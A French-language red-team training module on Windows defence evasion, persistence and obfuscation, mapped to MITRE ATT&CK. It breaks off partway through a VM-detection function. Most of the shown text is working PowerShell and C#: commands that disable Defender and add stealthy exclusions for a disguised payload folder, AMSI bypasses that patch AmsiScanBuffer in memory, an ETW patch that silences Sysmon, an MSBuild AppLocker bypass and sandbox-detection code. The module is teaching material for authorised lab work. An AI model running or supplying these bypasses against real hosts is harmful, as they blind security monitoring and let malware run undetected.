# Module 13 — Évasion, Persistance & Obfuscation

**Durée :** 1h00  
**Niveau :** M2 — Red Team  
**Prérequis :** Modules 1 à 12, maîtrise de PowerShell et Windows internals

---

## Environnement de lab
> **⚠️ AVERTISSEMENT** — Les commandes de ce module manipulent des paramètres système critiques (Defender, AMSI, registre).  
> **NE PAS** exécuter sur votre machine hôte ou sur le DC du lab AD.  
> **Utiliser une VM Windows 10/11 dédiée** avec un snapshot de sécurité activé.
>
> ```bash
> # Prérequis sur la VM Windows :
> # - PowerShell en tant qu'Administrateur
> # - Defender désactivé uniquement dans la VM isolée
> ```

## Table des matières

1. [Introduction et cadre réglementaire](#1-introduction-et-cadre-réglementaire)
2. [Évasion — Contournement des défenses](#2-évasion--contournement-des-défenses)
3. [Obfuscation de code et de payloads](#3-obfuscation-de-code-et-de-payloads)
4. [Persistance](#4-persistance)
5. [Rootkits & Bootkits — Aperçu](#5-rootkits--bootkits--aperçu)
6. [TP Synthèse](#6-tp-synthèse)
7. [Références](#7-références)

---

## 1. Introduction et cadre réglementaire

### 1.1 Pourquoi ce module est critique

Une opération Red Team réussie n'est pas simplement une question d'intrusion initiale. La capacité à **rester caché**, à **maintenir l'accès** et à **compromettre durablement** un système définit l'écart entre un test d'intrusion standard et une simulation d'adversaire réaliste (Adversary Emulation).

```
┌─────────────────────────────────────────────────────────────────┐
│                 CYCLE DE VIE RED TEAM (SIMPLIFIÉ)               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐  │
│  │ Recon    │───▶│ Intrusion│───▶│ ÉVASION  │───▶│ PERSIST. │  │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘  │
│                                                     │           │
│                                                     ▼           │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐  │
│  │ Obfusc.  │◀───│ Latéral. │◀───│ Collecte │◀───│ C2 Setup │  │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 Cadre NIS2 — Article 21

La **directive NIS2** (Network and Information Security 2) impose aux entités essentielles et importantes :

| Exigence NIS2 Art. 21 | Implication Red Team |
|------------------------|----------------------|
| Analyse des risques et sécurité des SI | Les défenses sont structurées et documentées |
| Gestion des incidents | Capacité de détection formalisée |
| **Continuité des activités** (21.2.c) | Mécanismes de persistance testés |
| Sécurité de la chaîne d'approvisionnement | Vecteurs d'attaque indirects vérifiés |
| **Politiques de test et d'audit** | Tests Red Team obligatoires |

L'article 21.2(g) de NIS2 exige explicitement des tests de sécurité incluant des exercices Red Team pour les entités critiques. Les techniques d'évasion, de persistance et d'obfuscation sont donc **au cœur du périmètre d'évaluation réglementaire**.

### 1.3 Mapping MITRE ATT&CK

Ce module couvre les techniques suivantes de la matrice MITRE ATT&CK Enterprise :

| Technique | ID | Phase |
|-----------|-----|-------|
| **Defense Evasion** | TA0005 | — |
| Impair Defenses: Disable or Modify Tools | T1562.001 | Defense Evasion |
| Subvert Trust Controls: Code Signing | T1553.002 | Defense Evasion |
| Obfuscated Files or Information | T1027 | Defense Evasion |
| Software Packing | T1027.002 | Defense Evasion |
| Steganography | T1027.003 | Defense Evasion |
| Debugger Evasion | T1622 | Defense Evasion |
| **Persistence** | TA0003 | — |
| Registry Run Keys / Startup Folder | T1547.001 | Persistence |
| Scheduled Task | T1053.005 | Persistence |
| Windows Service | T1543.003 | Persistence |
| WMI Event Subscription | T1546.003 | Persistence |
| DLL Search Order Hijacking | T1574.001 | Persistence |
| COM Hijacking | T1546.015 | Persistence |

---

## 2. Évasion — Contournement des défenses

### 2.1 Cartographie des défenses classiques

Avant d'échapper à un dispositif de détection, il faut le **cartographier**. Voici l'architecture typique des défenses Windows Enterprise :

```
┌───────────────────────────────────────────────────────────────────────┐
│                    HÔTE WINDOWS — DÉFENSES EN COUCHES                 │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  ┌─────────────────────────────────────────────────────────────────┐ │
│  │                     APPLICATIONS UTILISATEUR                    │ │
│  │  ┌────────┐  ┌────────┐  ┌────────┐  ┌──────────┐  ┌────────┐ │ │
│  │  │AppLock │  │ AMSI   │  │CredGrd │  │ CFG/DEP  │  │ Sandbx │ │ │
│  │  │(WDAC)  │  │ (T1562)│  │(T1003) │  │ (T1622)  │  │ (T1497)│ │ │
│  │  └────────┘  └────────┘  └────────┘  └──────────┘  └────────┘ │ │
│  └─────────────────────────────────────────────────────────────────┘ │
│                               │                                       │
│                               ▼                                       │
│  ┌─────────────────────────────────────────────────────────────────┐ │
│  │                        KERNEL / USERLAND                        │ │
│  │  ┌─────────────┐ ┌─────────────┐ ┌──────────────┐               │ │
│  │  │  EDR Hook   │ │  ETW Trace  │ │  Callbacks   │               │ │
│  │  │  (Userland) │ │  (T1562.006)│ │  (PsSetCr...)│               │ │
│  │  └─────────────┘ └─────────────┘ └──────────────┘               │ │
│  └─────────────────────────────────────────────────────────────────┘ │
│                               │                                       │
│                               ▼                                       │
│  ┌─────────────────────────────────────────────────────────────────┐ │
│  │                         KERNEL LAND                             │ │
│  │  ┌─────────────┐ ┌─────────────┐ ┌──────────────┐               │ │
│  │  │  Defender   │ │  WD Filter  │ │  PatchGuard  │               │ │
│  │  │  (ELAM)     │ │  Driver     │ │  (KPP)       │               │ │
│  │  └─────────────┘ └─────────────┘ └──────────────┘               │ │
│  └─────────────────────────────────────────────────────────────────┘ │
│                               │                                       │
│                               ▼                                       │
│  ┌─────────────────────────────────────────────────────────────────┐ │
│  │                      RÉSEAU (NDIS / Filter)                     │ │
│  │  ┌─────────────┐ ┌─────────────┐ ┌──────────────┐               │ │
│  │  │  Windows    │ │  NetFlow    │ │  SSL/TLS     │               │ │
│  │  │  Firewall   │ │  / EDR      │ │  Inspection  │               │ │
│  │  └─────────────┘ └─────────────┘ └──────────────┘               │ │
│  └─────────────────────────────────────────────────────────────────┘ │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### 2.2 Anti-virus — Identification et contournement (T1562.001)

#### 2.2.1 Identifier l'AV présent sur la cible

**Via le Task Manager (interface graphique) :**

```
Ctrl + Shift + Esc → Détails → Trouver les processus AV
```

**Via PowerShell (à privilégier) :**

```powershell
# Méthode 1 : WMI — identifier le produit de sécurité installé
# T1562.001 — Reconnaissance des outils de défense
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | 
    Select-Object displayName, productState, pathToSignedProductExe

# Résultat typique :
# displayName         productState  pathToSignedProductExe
# -----------         ------------  ----------------------
# Microsoft Defender  397568        %ProgramFiles%\Windows Defender\MSMpEng.exe
```

```powershell
# Méthode 2 : Énumération des processus en cours
# Identifier les processus AV/EDR connus par leur nom
$avProcesses = @(
    'MsMpEng',     # Windows Defender
    'MsSense',     # Defender ATP
    'SenseIR',     # Defender ATP
    'SenseNdr',    # Defender for Identity
    'cyserver',    # Cylance
    'csfalconservice',  # CrowdStrike
    'sentinelagent',    # SentinelOne
    'cb.exe',      # Carbon Black
    'dsa',         # McAfee
    'rtvscan',     # Symantec
    'ekrn',        # ESET
    'sophosav',    # Sophos
    'TmListen',    # Trend Micro
    'avp'          # Kaspersky
)
Get-Process | Where-Object { $avProcesses -contains $_.Name } |
    Select-Object Name, Id, Path
```

**Via WMIC (méthode legacy, fonctionne sur Windows 7/8/10) :**

```cmd
:: T1562.001 — Inventory des produits de sécurité
wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState

:: Vérification du statut Defender
wmic /node:localhost /namespace:\\root\Microsoft\Windows\Defender path MSFT_MpComputerStatus get AMRunningMode,AntispywareEnabled,AntivirusEnabled,RealTimeProtectionEnabled
```

#### 2.2.2 Désactiver Windows Defender — Approche registre (nécessite SYSTEM)

```powershell
# Vérifier les privilèges Administrateur
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[-] Relancer PowerShell en tant qu'Administrateur" -ForegroundColor Red
    exit 1
}

# ⚠️ NÉCESSITE DES PRIVILÈGES ÉLEVÉS (NT AUTHORITY\SYSTEM)
# T1562.001 — Défense Evasion via désactivation Defender

# 1. Désactiver Defender via la clé de registre DisableAntiSpyware
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" `
    -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force

# 2. Désactiver la protection en temps réel
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" `
    -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force

# 3. Désactiver la soumission d'échantillons (MAPS)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" `
    -Name "SpyNetReporting" -Value 0 -Type DWord -Force
    # SpyNetReporting: 0 = Désactivé, 1 = Basique, 2 = Avancé

# 4. Désactiver l'IOAV (Inspection On Access for Antivirus)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" `
    -Name "DisableIOAVProtection" -Value 1 -Type DWord -Force

# 5. Vérifier le résultat
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
```

**Attention :** Depuis Windows 10 1903, `DisableAntiSpyware` est ignoré pour les machines non-entreprises si le Tamper Protection est activé. Il faut d'abord désactiver le Tamper Protection.

#### 2.2.3 Désactiver Defender — Approche GPO locale

```powershell
# T1562.001 — Désactivation via stratégie de groupe locale
# Utilisation de l'outil LGPO.exe (Security Compliance Toolkit)

# Alternative : importer une GPO de désactivation préparée
# Chemin complet de la GPO locale Defender désactivée
# HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications

# Désactiver les notifications de sécurité
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" `
    -Name "DisableNotifications" -Value 1 -Type DWord -Force
```

#### 2.2.4 Exclusion de dossiers — Méthode de contournement privilégiée

Plutôt que de désactiver Defender (très visible), l'exclusion de dossiers est plus discrète :

```powershell
# T1562.001 — Ajout d'un chemin d'exclusion pour Defender
# Cette technique est BEAUCOUP moins détectable que la désactivation complète

$exclusionPath = "C:\Users\Public\Documents\WindowsUpdate"

# Créer le dossier d'exclusion
New-Item -Path $exclusionPath -ItemType Directory -Force | Out-Null

# Ajouter l'exclusion via le provider WMI Defender
Add-MpPreference -ExclusionPath $exclusionPath

# Vérifier que l'exclusion est en place
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

# Supprimer l'exclusion (cleanup)
# Remove-MpPreference -ExclusionPath $exclusionPath
```

```powershell
# Exclusions avancées — par extension, processus, et IP
# T1562.001

# Exclusion par extension de fichier
Add-MpPreference -ExclusionExtension ".dat", ".bin", ".tmp"

# Exclusion par processus (le processus ne sera pas scanné)
Add-MpPreference -ExclusionProcess "C:\Users\Public\svchost.exe"

# Vérifier toutes les exclusions active
Get-MpPreference | Select-Object ExclusionExtension, ExclusionPath, ExclusionProcess | Format-List
```

```powershell
# Script complet — Ajout discret d'exclusion + persistance
# T1562.001 + TA0003
param(
    [string]$PayloadPath = "C:\Users\Public\Documents\WindowsUpdate\update.exe"
)

# Étape 1 : Créer le répertoire d'exclusion
$exclusionDir = Split-Path $PayloadPath -Parent
New-Item -Path $exclusionDir -ItemType Directory -Force | Out-Null

# Étape 2 : Appliquer l'attribut caché + système
attrib +h +s $exclusionDir

# Étape 3 : Ajouter l'exclusion Defender
try {
    Add-MpPreference -ExclusionPath $exclusionDir -ErrorAction SilentlyContinue
    Write-Host "[+] Exclusion ajoutée : $exclusionDir" -ForegroundColor Green
} catch {
    Write-Host "[-] Échec ajout exclusion (vérifier les privilèges)" -ForegroundColor Red
}
```

### 2.3 AMSI Bypass (T1562.001)

#### 2.3.1 Comprendre AMSI (Antimalware Scan Interface)

AMSI est une API Windows qui permet aux applications de soumettre du contenu (scripts, PowerShell, .NET assemblies) au moteur antivirus avant exécution.

```
┌──────────────────────────────────────────────────────────┐
│                  FONCTIONNEMENT AMSI                      │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  ┌──────────┐    ┌──────────────┐    ┌──────────────┐   │
│  │PowerShell│───▶│ amsi.dll     │───▶│am  si.dll    │   │
│  │ Script   │    │AmsiInitialize│    │AmsiScanBuffer│   │
│  └──────────┘    └──────────────┘    └──────┬───────┘   │
│                                             │           │
│                                             ▼           │
│                                    ┌──────────────┐     │
│                                    │  Defender    │     │
│                                    │  (MsMpEng)   │     │
│                                    └──────────────┘     │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

#### 2.3.2 AMSI Bypass #1 — Désactiver AMSI via le registre

```powershell
# T1562.001 — Méthode registre (nécessite admin)
# Fonctionne pour la session PowerShell locale

# Simuler l'entrée registre pour l'application PowerShell
$amsiKey = "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"

# Vérifier l'existence de la clé
if (Test-Path $amsiKey) {
    # Supprimer le provider AMSI pour PowerShell
    Remove-Item -Path $amsiKey -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] AMSI Provider PowerShell supprimé" -ForegroundColor Green
}
```

#### 2.3.3 AMSI Bypass #2 — Forcer l'échec d'AmsiInitialize

```powershell
# T1562.001 — Patcher AmsiInitialize via réflexion .NET
# Technique classique de force fail — AmsiInitialize échoue toujours

[Reflection.Assembly]::LoadWithPartialName("System");
[Reflection.Assembly]::LoadWithPartialName("System.Core");

$methods = @"
using System;
using System.Runtime.InteropServices;

public class AmsiBypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
        uint flNewProtect, out uint lpflOldProtect);
    
    public static void Patch() {
        IntPtr amsiDll = LoadLibrary("amsi.dll");
        IntPtr amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer");
        uint oldProtect;
        
        // Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
        // This forces AMSI to return E_INVALIDARG, meaning it fails to scan
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        
        VirtualProtect(amsiScanBufferAddr, (UIntPtr)patch.Length, 0x40, out oldProtect);
        Marshal.Copy(patch, 0, amsiScanBufferAddr, patch.Length);
        VirtualProtect(amsiScanBufferAddr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
    }
}
"@

Add-Type -TypeDefinition $methods
[AmsiBypass]::Patch()
Write-Host "[+] AMSI patché — AmsiScanBuffer retourne toujours E_INVALIDARG" -ForegroundColor Green

# Test : essayer un script qui serait normalement bloqué
# Invoke-Mimikatz serait maintenant autorisé (mais d'autres couches peuvent bloquer)
```

#### 2.3.4 AMSI Bypass #3 — Désactiver PowerShell AMSI via chaîne altérée

```powershell
# T1562.001 — Méthode par désactivatation de la variable d'environnement
# Ne nécessite pas d'admin si fait avant le chargement du module

# Solution 1 : Lancer PowerShell en mode NoProfile + ExecutionPolicy Bypass
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "..."

# Solution 2 : Désactiver AMSI via le paramètre système (admin requis)
[System.Environment]::SetEnvironmentVariable(
    "AMSIDisable", "1", 
    [System.EnvironmentVariableTarget]::Machine
)
# ⚠️ Nécessite redémarrage du processus PowerShell pour prise d'effet
```

#### 2.3.5 AMSI Bypass #4 — Script complet multi-méthode

```powershell
# T1562.001 — Script AMSI bypass combinant plusieurs techniques
# Testé sur Windows 10/11, PowerShell 5.1 et 7.x

function Invoke-AmsiBypass {
    param(
        [ValidateSet("Reflection", "MemoryPatch", "Registry", "All")]
        [string]$Method = "All"
    )
    
    function Test-AmsiAlive {
        $testString = 'AmsiUtils'  # Trigger potentiel
        try {
            $result = [AmsiUtils]::amsiInitFailed
            return $false  # AMSI fonctionne
        } catch {
            return $true   # AMSI hors-service
        }
    }
    
    # Méthode 1 : Reflection — remplace amsiInitFailed par $true
    if ($Method -eq "Reflection" -or $Method -eq "All") {
        try {
            $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*iUtils' }
            if ($a) {
                $b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*Context*' }
                if ($b) {
                    $c = $b.GetValue($null)
                    $d = $c.GetType().GetField('amsiSession', 'NonPublic,Instance')
                    $d.SetValue($c, 0)
                    Write-Host "[+] AMSI Bypass: Reflection réussi" -ForegroundColor Green
                }
            }
        } catch {
            Write-Host "[-] AMSI Bypass: Reflection échoué: $_" -ForegroundColor Yellow
        }
    }
    
    # Méthode 2 : Memory patch — patch AmsiScanBuffer
    if ($Method -eq "MemoryPatch" -or $Method -eq "All") {
        try {
            $w = "System"
            $r = [Reflection.Assembly]::LoadWithPartialName($w)
            $asm = @"
            using System;
            using System.Runtime.InteropServices;
            public class Patcher {
                [DllImport("kernel32")]
                public static extern IntPtr GetProcAddress(IntPtr h, string p);
                [DllImport("kernel32")]
                public static extern IntPtr LoadLibrary(string n);
                [DllImport("kernel32")]
                public static extern bool VirtualProtect(IntPtr a, UIntPtr s, 
                    uint p, out uint o);
                public static void Do() {
                    IntPtr lib = LoadLibrary("amsi.dll");
                    IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
                    uint o;
                    VirtualProtect(addr, (UIntPtr)6, 0x40, out o);
                    Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3}, 0, addr, 6);
                }
            }
"@
            Add-Type -TypeDefinition $asm
            [Patcher]::Do()
            Write-Host "[+] AMSI Bypass: Memory patch réussi" -ForegroundColor Green
        } catch {
            Write-Host "[-] AMSI Bypass: Memory patch échoué: $_" -ForegroundColor Yellow
        }
    }
    
    Write-Host "[*] AMSI état: $(if (Test-AmsiAlive) {'BYPASSÉ ✓'} else {'ACTIF ✗'})" -ForegroundColor Cyan
}

# Exécution
Invoke-AmsiBypass -Method All
```

### 2.4 AppLocker Bypass (T1562.001 / T1218)

#### 2.4.1 Comprendre AppLocker

AppLocker restreint l'exécution des binaires à des emplacements et signatures autorisés. Un contournement typique utilise les **chemins alternatifs d'écriture** ou les **LOLBins** (Living Off the Land Binaries).

```powershell
# T1562.001 — Identifier les règles AppLocker en vigueur
# Vérifier si AppLocker est actif
$service = Get-Service -Name "AppIDSvc" -ErrorAction SilentlyContinue
Write-Host "[*] Service AppLocker: $($service.Status)" -ForegroundColor Cyan

# Énumérer les règles AppLocker
Get-AppLockerPolicy -Effective | 
    Select-Object -ExpandProperty RuleCollections | 
    Select-Object -ExpandProperty RuleCollectionTypes
```

#### 2.4.2 Chemins d'écriture accessibles

```powershell
# T1562.001 / T1574.001 — Rechercher les répertoires où l'utilisateur peut écrire
# et où des exécutables sont autorisés

$writeablePaths = @()
$pathsToCheck = @(
    "C:\Windows\Temp",
    "C:\Windows\Tasks",
    "C:\Windows\System32\spool\drivers\color",
    "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
    "C:\Windows\Registration\CRMLog",
    "C:\Users\*\AppData\Local\Temp",
    "C:\Users\*\AppData\Local\Microsoft\Windows\INetCache",
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
    "C:\PerfLogs"
)

foreach ($path in $pathsToCheck) {
    try {
        $testPath = [System.IO.Path]::Combine($path, "test_$(Get-Random).tmp")
        [System.IO.File]::WriteAllText($testPath, "test") | Out-Null
        Remove-Item $testPath -Force -ErrorAction SilentlyContinue
        $writeablePaths += $path
    } catch {}
}

Write-Host "[+] Chemins accessibles en écriture :" -ForegroundColor Green
$writeablePaths | ForEach-Object { Write-Host "    $_" }
```

#### 2.4.3 LOLBins : liste des binaires signés détournables

```powershell
# T1218 — Living Off the Land Binaries
# Ces exécutables sont signés Microsoft et souvent configurés par défaut
# dans les règles AppLocker. Ils peuvent être détournés.

$LOLBins = @(
    @{Name="Mshta.exe";         Path="C:\Windows\System32\mshta.exe";          Usage="Exécute HTA/JS à distance"},
    @{Name="Msiexec.exe";       Path="C:\Windows\System32\msiexec.exe";        Usage="Exécute MSI distant"},
    @{Name="Regsvr32.exe";      Path="C:\Windows\System32\regsvr32.exe";       Usage="Exécute DLL/COM distant"},
    @{Name="Rundll32.exe";      Path="C:\Windows\System32\rundll32.exe";       Usage="Exécute fonction DLL"},
    @{Name="Wmic.exe";          Path="C:\Windows\System32\wbem\WMIC.exe";      Usage="Exécute XSL/WMI distant"},
    @{Name="Certutil.exe";      Path="C:\Windows\System32\certutil.exe";       Usage="Télécharge depuis URL"},
    @{Name="Cscript.exe";       Path="C:\Windows\System32\cscript.exe";        Usage="Exécute VBS/JS"},
    @{Name="Wscript.exe";       Path="C:\Windows\System32\wscript.exe";        Usage="Exécute VBS/JS"},
    @{Name="Csc.exe";           Path="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"; Usage="Compile C#"},
    @{Name="InstallUtil.exe";   Path="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"; Usage="Exécute .NET"},
    @{Name="Msbuild.exe";       Path="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"; Usage="Exécute projet MSBuild"},
    @{Name="Bginfo.exe";        Path="C:\Program Files\Sysinternals\BGInfo.exe"; Usage="Exécute script via VB"},
    @{Name="Cdb.exe";           Path="C:\Program Files\Windows Kits\10\Debuggers\x64\cdb.exe"; Usage="Exécute code via debug"},
    @{Name="Cmstp.exe";         Path="C:\Windows\System32\cmstp.exe";          Usage="Exécute inf malveillant"},
    @{Name="Dnscmd.exe";        Path="C:\Windows\System32\dnscmd.exe";         Usage="Charge DLL depuis path"}
)

$LOLBins | Format-Table Name, Usage -AutoSize
```

**Exemple pratique — Utilisation de Msbuild.exe pour exécuter du code :**

```xml
<!-- T1218.008 — MSBuild inline task execution -->
<!-- Sauvegarder ce fichier en build.xml -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="ExecutePaylad">
    <LaunchPayload />
  </Target>
  <UsingTask TaskName="LaunchPayload"
             TaskFactory="CodeTaskFactory"
             AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
<![CDATA[
using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class LaunchPayload : Task, ITask
{
    public override bool Execute()
    {
        // T1055 — Process Injection example
        // Exécute calc.exe comme preuve de concept
        Process.Start("calc.exe");
        return true;
    }
}
]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
:: T1218.008 — Exécution du payload MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe build.xml
```

### 2.5 Sysmon Évasion (T1562.001 / T1562.006)

#### 2.5.1 Détecter la présence de Sysmon

```powershell
# T1562.001 — Vérifier si Sysmon est installé et actif
Get-Service -Name "Sysmon*", "Sysmon64*" | 
    Select-Object Name, Status, StartType

# Vérifier via le processus (Sysmon tourne comme driver + service)
Get-Process -Name "Sysmon*" -ErrorAction SilentlyContinue

# Vérifier via les clés de registre
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv" -ErrorAction SilentlyContinue
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Sysmon" -ErrorAction SilentlyContinue

# Vérifier le fichier de configuration
$sysmonConfig = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters" -Name "Rules" -ErrorAction SilentlyContinue
if ($sysmonConfig) {
    Write-Host "[!] Sysmon configuré — fichier de règles actif" -ForegroundColor Yellow
}
```

#### 2.5.2 Stratégies d'évasion Sysmon

```powershell
# T1562.001 — Stratégie 1 : Désactiver Sysmon (nécessite admin)
# ⚠️ TRÈS BRUYANT — Génère un Event ID 1

# Arrêter le service
net stop Sysmon64

# Désactiver le driver
sc config SysmonDrv start= disabled

# Stratégie retrait — suppression de la règle (admin requis mais discret)
# Supprimer l'entrée de registre contenant la configuration
# Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters" -Name "Rules"
```

```powershell
# T1562.006 — Stratégie 2 : Désactiver ETW (Event Tracing for Windows)
# Sysmon (et la plupart des EDR) s'appuient sur ETW pour les événements
# ⚠️ Nécessite des privilèges élevés

# Désactiver ETW via le provider PowerShell
# Technique: SetEtwEnabled patching
$etwPatch = @"
using System;
using System.Runtime.InteropServices;
public class EtwPatcher {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
        uint flNewProtect, out uint lpflOldProtect);
    
    public static void DisableETW() {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        uint oldProtect;
        
        // Patch: ret (0xC3) — empêche toute écriture d'événement ETW
        byte[] patch = { 0xC3 };
        
        VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, 0x40, out oldProtect);
        Marshal.Copy(patch, 0, etwEventWrite, patch.Length);
        VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, oldProtect, out oldProtect);
    }
}
"@
Add-Type -TypeDefinition $etwPatch
[EtwPatcher]::DisableETW()
Write-Host "[+] ETW désactivé — les événements Sysmon ne sont plus générés" -ForegroundColor Green
```

```powershell
# T1562.006 — Stratégie 3 : Évasion comportementale (pas de patch)
# Éviter les patterns qui déclenchent Sysmon
# Règle: Éviter les parents inhabituels (Word qui lance PowerShell, etc.)

# BON: chaîne de processus légitime
# svchost.exe → cmd.exe → powershell.exe (naturel)
# service.exe → wmiPrvSE.exe (naturel, via WMI)

# MAUVAIS: chaîne suspecte (triggers Sysmon Event ID 1)
# WINWORD.EXE → powershell.exe -enc <base64> (ALERTE!)
# outlook.exe → cmd.exe /c certutil.exe (ALERTE!)
# wscript.exe → rundll32.exe (ALERTE!)

# Astuce: se cacher dans l'arbre de processus légitime
# Injecter dans un processus fils de svchost plutôt que de lancer directement
```

### 2.6 Sandbox / VM Detection (T1497 / T1622)

#### 2.6.1 Pourquoi détecter l'environnement

Les sandboxes (analyse dynamique) et machines virtuelles exécutent les payloads dans un environnement isolé pour observation. Détecter ces environnements permet :

- D'**éviter l'exécution** en sandbox (le payload reste dormant)
- De **contourner l'analyse** automatisée
- D'**augmenter la furtivité** du payload final

```powershell
# T1497.001 — Détection complète de sandbox / VM
# Méthode 1 : Vérifications du registre (machines virtuelles)

function Test-VirtualEnvironment {
    [CmdletBinding()]
    param()
    
    $indicators = @()
    $isVM = $false
    
    # 1. Vérification MAC Address (plages OUI connues VM)
    $vmMacPrefixes = @(
        "00:05:69",  # VMware
        "00:0C:29",  # VMware
        "00:1C:14",  # VMware
        "00:50:56",  # VMware
        "00:15:5D",  # Hyper-V
        "00:03:FF",  # VirtualBox
        "08:00:27",  # VirtualBox
        "00:16:3E",  # Xen
        "00:1C:42"   # Parallels
    )
    
    $macs = Get-CimInstance -ClassName Win32_NetworkAdapter |
        Where-Object { $_.MacAddress -and $_.AdapterType -ne "VMware" } |
        Select-Object -ExpandProperty MacAddress
    
    foreach ($mac in $macs) {
        foreach ($prefix in $vmMacPrefixes) {
            if ($mac.StartsWith($prefix, [StringComparison]::OrdinalIgnoreCase)) {
                $indicators += "MAC Address VM détectée: $mac (préfixe: $prefix)"
                $isVM = $true
            }
        }
    }
    
    # 2. Vérification des processus VM
    $vmProcesses = @(
        "vmtoolsd",        # VMware Tools
        "VmwareTray",      # VMware Tray
        "vmwaretray",      # VMware Tray
        "VBoxService",     # VirtualBox
        "VBoxTray",        # VirtualBox
        "xenservice",      # Xen
        "vmusrvc",         # VMware User Service
        "vmsrvc",          # VMware
        "vboxtray",        # VirtualBox
        "vboxservice"      # VirtualBox
    )
    
    $running = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
    foreach ($proc in $vmProcesses) {
        if ($running -contains $proc) {
            $indicators += "Processus VM détecté: $proc"
            $isVM = $true
        }
    }
    
    # 3. Vérification du fabricant BIOS/System
    $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction SilentlyContinue
    $system = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
    
    if ($bios) {
        if ($bios.Version -match "VRTUAL|A M I|BOCHS|Xen") {
            $indicators += "BIOS virtuel: $($bios.Version)"
            $isVM = $true
        }
        if ($bios.SMBIOSBIOSVersion -match "VMware|VBox|Xen|Hyper-V") {
            $indicators += "SMBIOS VM: $($bios.SMBIOSBIOSVersion)"
            $isVM = $true
        }
    }
    
    if ($system) {
        if ($system.Manufacturer -match "VMware|VirtualBox|Xen|Microsoft Corporation" -and 
            $system.Model -match "Virtual") {
            $indicators += "Fabricant VM: $($system.Manufacturer) / $($system.Model)"
            $isVM = $true
        }
    }
    
    # 4. Vérification des drivers VM
    $vmDrivers = @(
        "vmmouse", "vmci", "vmhgfs", "vmmemctl", "vmxnet",
        "vboxguest", "vboxsf", "vboxvideo", "vboxmouse",
        "vpcbus", "vpcusb", "vpcvmmouse", "vpcs3", "vpcnet"
    )
    
    $installedDrivers = Get-CimInstance -ClassName Win32_SystemDriver |
        Select-Object -ExpandProperty Name
    
